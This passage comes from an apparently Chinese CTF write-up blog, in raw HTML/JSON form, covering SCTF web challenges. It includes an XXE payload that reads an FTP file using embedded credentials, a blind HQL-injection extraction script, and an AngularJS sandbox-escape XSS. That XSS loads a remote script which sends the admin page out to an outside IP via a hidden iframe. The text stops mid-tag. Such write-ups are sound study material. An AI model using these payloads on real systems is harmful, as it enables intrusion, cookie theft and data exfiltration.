flag327a6c4304ad5938eaf0efb6cc3e53dc</span><br></pre></td></tr></table></figure>\n<h3 id=\"xxe读取172-18-0-4-21-flag327a6c4304ad5938eaf0efb6cc3e53dc\"><a href=\"#xxe读取172-18-0-4-21-flag327a6c4304ad5938eaf0efb6cc3e53dc\" class=\"headerlink\" title=\"xxe读取172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc\"></a>xxe读取172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc</h3><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!ENTITY file SYSTEM \"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc\"&gt;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plans</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plan</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">content</span>&gt;</span>&amp;file;<span class=\"tag\">&lt;/<span class=\"name\">content</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plan</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">plans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">20 minutes ago sctf&#123;Not_0n1y_xx3_but_als0_web_cache&#125;</span><br></pre></td></tr></table></figure>\n<p>##Zhuanxv</p>\n<h3 id=\"主要代码片段\"><a href=\"#主要代码片段\" class=\"headerlink\" title=\"主要代码片段\"></a>主要代码片段</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//UserLoginAction.class</span><br><span class=\"line\">public boolean userCheck(User user) &#123;</span><br><span class=\"line\">    List &lt; User &gt; userList = this.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class=\"line\">    if ((userList != null) &amp;&amp; (userList.size() == 1)) &#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    addActionError(&quot;Username or password is Wrong, please check!&quot;);</span><br><span class=\"line\">    return false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//UserServiceImpl.class</span><br><span class=\"line\">public List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class=\"line\">    name = name.replaceAll(&quot; &quot;, &quot;&quot;);</span><br><span class=\"line\">    name = name.replaceAll(&quot;=&quot;, &quot;&quot;);</span><br><span class=\"line\">    Matcher username_matcher = Pattern.compile(&quot;^[0-9a-zA-Z]+$&quot;).matcher(name);</span><br><span class=\"line\">    Matcher password_matcher = Pattern.compile(&quot;^[0-9a-zA-Z]+$&quot;).matcher(password);</span><br><span class=\"line\">    if (password_matcher.find()) &#123;</span><br><span class=\"line\">        return this.userDao.loginCheck(name, password);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//UserDaoImpl.class</span><br><span class=\"line\">public List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class=\"line\">    return getHibernateTemplate().find(&quot;from User where name =&apos;&quot; + name + &quot;&apos; and password = &apos;&quot; + password + &quot;&apos;&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">s=requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\"># 漏洞语句 hql</span><br><span class=\"line\"># from User where name = &apos;&quot; + name + &quot;&apos; and password = &apos;&quot; + password + &quot;&apos;&quot;</span><br><span class=\"line\"># </span><br><span class=\"line\"># 更简单的payload</span><br><span class=\"line\"># user.name=1&apos;or(from%0aFlag)like&apos;sctf&#123;%25&apos;or&apos;&apos;like&apos;&amp;user.password=asdf</span><br><span class=\"line\">flag=&apos;&apos;</span><br><span class=\"line\">for i in range(1,50):</span><br><span class=\"line\">    p=&apos;&apos;</span><br><span class=\"line\">    for j in range(1,255):</span><br><span class=\"line\">        # 注意空格需要替换为换行(%0a)或者(%09)W，这是因为代码中将空格替换为&quot;&quot;</span><br><span class=\"line\">        payload=&quot;(select%0aascii(substr(id,&quot;+str(i)+&quot;,1))%0afrom%0aFlag%0awhere%0aid&lt;2)&lt;&apos;&quot;+str(j)+&quot;&apos;&quot;</span><br><span class=\"line\">        #print payload</span><br><span class=\"line\">        url=&quot;http://121.196.195.244:9032/zhuanxvlogin?user.name=admin&apos;or%0a&quot;+payload+&quot;%0aor%0aname%0alike%0a&apos;admin&amp;user.password=1&quot;</span><br><span class=\"line\">        print url</span><br><span class=\"line\">        r1=s.get(url)</span><br><span class=\"line\">        #print url</span><br><span class=\"line\">        #print len(r1.text)</span><br><span class=\"line\">        if len(r1.text)&gt;20000 and p!=&apos;&apos;:</span><br><span class=\"line\">            flag+=p</span><br><span class=\"line\">            print i,flag</span><br><span class=\"line\">            break</span><br><span class=\"line\">        p=chr(j)</span><br><span class=\"line\"></span><br><span class=\"line\"># http://121.196.195.244:9032/zhuanxvlogin?user.name=admin&apos;or%0a(select%0Aascii(substr(id,1,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&apos;116&apos;%0aor%0aname%0alike%0a&apos;admin&amp;user.password=1</span><br><span class=\"line\"># user.name=1&apos;or(from%0aFlag)like&apos;sctf&#123;%25&apos;or&apos;&apos;like&apos;&amp;user.password=aaaa</span><br></pre></td></tr></table></figure>\n<h2 id=\"BabySyc-Simple-PHP-Web\"><a href=\"#BabySyc-Simple-PHP-Web\" class=\"headerlink\" title=\"BabySyc - Simple PHP Web\"></a>BabySyc - Simple PHP Web</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h2 id=\"新的建议板\"><a href=\"#新的建议板\" class=\"headerlink\" title=\"新的建议板\"></a>新的建议板</h2>","more":"<ol>\n<li><p>基础payload</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;<span class=\"string\">'a'</span>.constructor.prototype.charAt=[].join;$<span class=\"built_in\">eval</span>(<span class=\"string\">'x=1&#125; &#125; &#125;;eval(alert(1))//'</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>打cookie</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;<span class=\"string\">'a'</span>.constructor.prototype.charAt=[].join;$<span class=\"built_in\">eval</span>(<span class=\"string\">'x=1&#125; &#125; &#125;;eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==\\'))//'</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>调用script</p>\n<p>使用</p>\n<blockquote>\n<p>$.getScript(‘<a href=\"https://xsspt.com/HMTzMS&#39;\" target=\"_blank\" rel=\"noopener\">https://xsspt.com/HMTzMS&#39;</a>)</p>\n</blockquote>\n<blockquote>\n<p>base64一下: <code>JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==</code></p>\n</blockquote>\n</li>\n<li><p>这样就可以拿到cookie</p>\n<p>接收到的内容如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location : http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1%7D%20%7D%20%7D;eval(atob(%5C&apos;JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==%5C&apos;))//&apos;);%7D%7D</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>cookie里边并没有flag，并且给的地址为本地地址，并不在公网上。</p>\n</li>\n<li><p>获取<code>/admin</code>的内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">$.getScript(&apos;http://123.207.90.143/su.js&apos;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;eval(atob(\\&apos;JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\\&apos;))//&apos;);&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>su.js内容即paylaod如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    url: &quot;/admin&quot;,</span><br><span class=\"line\">    type: &quot;GET&quot;,</span><br><span class=\"line\">    dataType: &quot;text&quot;,</span><br><span class=\"line\">    success: function(result) &#123;</span><br><span class=\"line\">        var code = btoa(encodeURIComponent(result));</span><br><span class=\"line\">        xssPost(&apos;http://123.207.90.143&apos;, code);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    error: function(msg) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">function xssPost(url, postStr) &#123;</span><br><span class=\"line\">    var de;</span><br><span class=\"line\">    de = document.body.appendChild(document.createElement(&apos;iframe&apos;));</span><br><span class=\"line\">    de.src = &apos;about:blank&apos;;</span><br><span class=\"line\">    de.height = 1;</span><br><span class=\"line\">    de.width = 1;</span><br><span class=\"line\">    de.contentDocument.write(&apos;&lt;form method=&quot;GET&quot; action=&quot;&apos; + url + &apos;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&apos; + postStr + &apos;&quot;/&gt;&lt;/form&gt;&apos;);</span><br><span class=\"line\">    de.contentDocument.forms[0].submit();</span><br><span class=\"line\">    de.style.display = &apos;none&apos;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>admin内容如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JTBEJTBBJTNDIURPQ1RZUEUlMjBodG1sJTNFJTBEJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJ6aC1DTiUyMiUzRSUwRCUwQSUyMCUyMCUzQ2hlYWQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMnV0Zi04JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJYLVVBLUNvbXBhdGlibGUlMjIlMjBjb250ZW50JTNEJTIySUUlM0RlZGdlJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDIS0tJTIwJUU0JUI4JThBJUU4JUJGJUIwMyVFNCVCOCVBQW1ldGElRTYlQTAlODclRTclQUQlQkUqJUU1JUJGJTg1JUU5JUExJUJCKiVFNiU5NCVCRSVFNSU5QyVBOCVFNiU5QyU4MCVFNSU4OSU4RCVFOSU5RCVBMiVFRiVCQyU4QyVFNCVCQiVCQiVFNCVCRCU5NSVFNSU4NSVCNiVFNCVCQiU5NiVFNSU4NiU4NSVFNSVBRSVCOSVFOSU4MyVCRColRTUlQkYlODUlRTklQTElQkIqJUU4JUI3JTlGJUU5JTlBJThGJUU1JTg1JUI2JUU1JTkwJThFJUVGJUJDJTgxJTIwLS0lM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwbmFtZSUzRCUyMmRlc2NyaXB0aW9uJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ21ldGElMjBuYW1lJTNEJTIyYXV0aG9yJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjByZWwlM0QlMjJpY29uJTIyJTIwaHJlZiUzRCUyMiUyMiUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3RpdGxlJTNFU1lDJTNDJTJGdGl0bGUlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZjc3MlMkZib290c3RyYXAubWluLmNzcyUyMiUyMHJlbCUzRCUyMnN0eWxlc2hlZXQlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmNzcyUyRmllMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzJTIyJTIwcmVsJTNEJTIyc3R5bGVzaGVldCUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjBocmVmJTNEJTIyY3NzJTJGc3RhcnRlci10ZW1wbGF0ZS5jc3MlMjIlMjByZWwlM0QlMjJzdHlsZXNoZWV0JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlMjB0eXBlJTNEJTIydGV4dCUyRmNzcyUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvZHklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLXRvcCUzQSUyMDYwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLWJvdHRvbSUzQSUyMDQwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZzdHlsZSUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYW5ndWxhci5qcyUyRjEuNC42JTJGYW5ndWxhci5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmMlM0QlMjJodHRwcyUzQSUyRiUyRmFwcHMuYmRpbWcuY29tJTJGbGlicyUyRmFuZ3VsYXItcm91dGUlMkYxLjMuMTMlMkZhbmd1bGFyLXJvdXRlLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUwRCUwQSUyMCUyMCUzQyUyRmhlYWQlM0UlMEQlMEElMEQlMEElMjAlMjAlM0Nib2R5JTIwJTNFJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTNDbmF2JTIwY2xhc3MlM0QlMjJuYXZiYXIlMjBuYXZiYXItaW52ZXJzZSUyMG5hdmJhci1maXhlZC10b3AlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybmF2YmFyLWhlYWRlciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2J1dHRvbiUyMHR5cGUlM0QlMjJidXR0b24lMjIlMjBjbGFzcyUzRCUyMm5hdmJhci10b2dnbGUlMjBjb2xsYXBzZWQlMjIlMjBkYXRhLXRvZ2dsZSUzRCUyMmNvbGxhcHNlJTIyJTIwZGF0YS10YXJnZXQlM0QlMjIlMjNuYXZiYXIlMjIlMjBhcmlhLWV4cGFuZGVkJTNEJTIyZmFsc2UlMjIlMjBhcmlhLWNvbnRyb2xzJTNEJTIybmF2YmFyJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyc3Itb25seSUyMiUzRVRvZ2dsZSUyMG5hdmlnYXRpb24lM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGYnV0dG9uJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDYSUyMGNsYXNzJTNEJTIybmF2YmFyLWJyYW5kJTIyJTIwaHJlZiUzRCUyMiUyRiUyMiUzRVNZQyUyMEFETUlOJTNDJTJGYSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGlkJTNEJTIybmF2YmFyJTIyJTIwY2xhc3MlM0QlMjJjb2xsYXBzZSUyMG5hdmJhci1jb2xsYXBzZSUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ3VsJTIwY2xhc3MlM0QlMjJuYXYlMjBuYXZiYXItbmF2JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjBjbGFzcyUzRCUyMmFjdGl2ZSUyMiUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFSG9tZSUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjIlMjMlMjIlM0UlRTYlOTclQTUlRTUlQkYlOTclM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU4JUI0JUE2JUU1JThEJTk1JTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NhJTIwaHJlZiUzRCUyMmFkbWluJTJGZmlsZSUyMiUzRSVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjJhZG1pbiUyRnN1Z2dlc3QlMjIlM0UlRTclOTUlOTklRTglQTglODAlM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU1JThGJTkxJUU1JUI4JTgzJTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0MlMkZuYXYlM0UlMEQlMEElMEQlMEElMEQlMEElM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyanVtYm90cm9uJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VIRUxMTyUyMGFkbWluQ2xvdW5kJTNDJTJGaDElM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFJUU2JTk2JUIwJUU3JTg5JTg4JUU1JTkwJThFJUU1JThGJUIwMi4wISUzQyUyRnAlM0UlMEQlMEElMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElM0MlMkZkaXYlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0MhLS0lMjBCb290c3RyYXAlMjBjb3JlJTIwSmF2YVNjcmlwdCUwRCUwQSUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUyMC0tJTNFJTBEJTBBJTNDIS0tJTIwUGxhY2VkJTIwYXQlMjB0aGUlMjBlbmQlMjBvZiUyMHRoZSUyMGRvY3VtZW50JTIwc28lMjB0aGUlMjBwYWdlcyUyMGxvYWQlMjBmYXN0ZXIlMjAtLSUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGanF1ZXJ5JTJGMS4xMi40JTJGanF1ZXJ5Lm1pbi5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZqcyUyRmJvb3RzdHJhcC5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElM0MhLS0lMjBJRTEwJTIwdmlld3BvcnQlMjBoYWNrJTIwZm9yJTIwU3VyZmFjZSUyRmRlc2t0b3AlMjBXaW5kb3dzJTIwOCUyMGJ1ZyUyMC0tJTNFJTBEJTBBJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZTEwLXZpZXdwb3J0LWJ1Zy13b3JrYXJvdW5kLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTBEJTBBJTNDJTJGYm9keSUzRSUwRCUwQSUzQyUyRmh0bWwlM0UlMEQlMEElMEQlMEE%3D</span><br></pre></td></tr></table></figure>\n<p>解码后:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">  &lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class=\"line\">        &lt;h1&gt;HELLO adminClound&lt;/h1&gt;</span><br><span class=\"line\">        &lt;p&gt;新版后台2.0!&lt;/p&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取<code>admin/file</code>，需要登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">  &lt;form method=&quot;post&quot;&gt;</span><br><span class=\"line\">    &lt;label for=&quot;filePasswd&quot; class=&quot;sr-only&quot;&gt;输入文件密码&lt;/label&gt;</span><br><span class=\"line\">    &lt;input type=&quot;text&quot; id=&quot;filePasswd&quot; class=&quot;form-control&quot; placeholder=&quot;filepasswd&quot; required=&quot;&quot; autofocus=&quot;&quot; name=&quot;filepasswd&quot;&gt;</span><br><span class=\"line\">    &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot;&gt;提交&lt;/button&gt;</span><br><span class=\"line\">  &lt;/form&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>我们发现新的用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 